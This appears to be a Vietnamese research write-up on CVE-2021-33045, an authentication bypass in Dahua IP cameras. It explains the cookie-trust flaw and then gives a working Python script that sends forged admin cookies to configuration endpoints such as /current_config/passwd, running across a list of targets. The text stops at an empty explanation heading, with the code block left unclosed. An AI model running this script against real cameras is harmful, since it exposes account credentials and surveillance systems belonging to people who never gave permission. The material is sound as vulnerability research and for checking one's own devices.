# CVE-2021-33045 – Nghiên cứu lỗ hổng trên camera IP Dahua

## 1. Giới thiệu

Camera IP Dahua là thiết bị IoT được sử dụng phổ biến trong các hệ thống giám sát an ninh. Do thường xuyên được triển khai trong mạng nội bộ hoặc truy cập từ Internet, các lỗ hổng bảo mật trên camera IP có thể gây ảnh hưởng nghiêm trọng đến quyền riêng tư và an toàn thông tin.

CVE-2021-33045 là lỗ hổng bảo mật tồn tại trên một số dòng camera Dahua, cho phép truy cập trái phép vào các tài nguyên cấu hình nội bộ mà **không cần xác thực hợp lệ**. Lỗ hổng này xuất phát từ cơ chế kiểm soát truy cập không chặt chẽ trong firmware của thiết bị.

---

## 2. Thông tin lỗ hổng

- **CVE ID:** CVE-2021-33045  
- **Thiết bị bị ảnh hưởng:** Camera IP Dahua  
- **Loại lỗ hổng:** Authentication Bypass / Improper Access Control    
- **Phiên bản ảnh hưởng:** https://cctvapp.net/en/2022/09/07/security-error-cve-2021-33044-cve-2021-33045-on-dahua-camera/

---

## 3. Nguyên nhân tồn tại lỗ hổng

Nguyên nhân chính của lỗ hổng CVE-2021-33045 là do **thiết kế xác thực không an toàn trong firmware camera Dahua**. Cụ thể:

- Camera sử dụng cookie phía client để xác định trạng thái đăng nhập
- Backend không xác minh session với hệ thống xác thực nội bộ
- Một số endpoint cấu hình nhạy cảm chỉ kiểm tra sự tồn tại của cookie, không kiểm tra quyền truy cập thực sự

---

## 4. Cơ chế hoạt động của lỗ hổng

Luồng hoạt động của lỗ hổng có thể được mô tả như sau:

1. Client gửi HTTP request kèm cookie tùy ý
2. Camera kiểm tra cookie ở mức giao diện
3. Không xác minh session hợp lệ ở backend
4. Cho phép truy cập trực tiếp vào các endpoint cấu hình nội bộ
5. Trả về dữ liệu nhạy cảm


---

## 5. Cách khai thác CVE-2021-33045
### 5.1 Script Python
```python
#!/usr/bin/env python3
import requests, sys
requests.packages.urllib3.disable_warnings()

def dump_accounts(ip, port=80):
    base = f"http://{ip}:{port}"
    cookies = {
        "userName": "admin",
        "userLevel": "1",
        "sessionID": "00000000"
    }
    urls = [
        "/current_config/passwd",
        "/current_config/Account1",
        "/current_config/UserMgr",
        "/current_config/accounts"
    ]

    for path in urls:
        try:
            r = requests.get(
                base + path,
                cookies=cookies,
                verify=False,
                timeout=8
            )
            if r.status_code == 200 and len(r.text) > 30:
                print(f"[+] {ip}:{port}  VULNERABLE → {path}")
                return
        except:
            pass

    print(f"[-] {ip}:{port}  safe / patched")

for line in open("targets.txt"):
    t = line.strip()
    if not t or t.startswith("#"):
        continue
    ip = t.split(":")[0]
    port = int(t.split(":")[1]) if ":" in t else 80
    dump_accounts(ip, port)

###5.2 Giải thích 
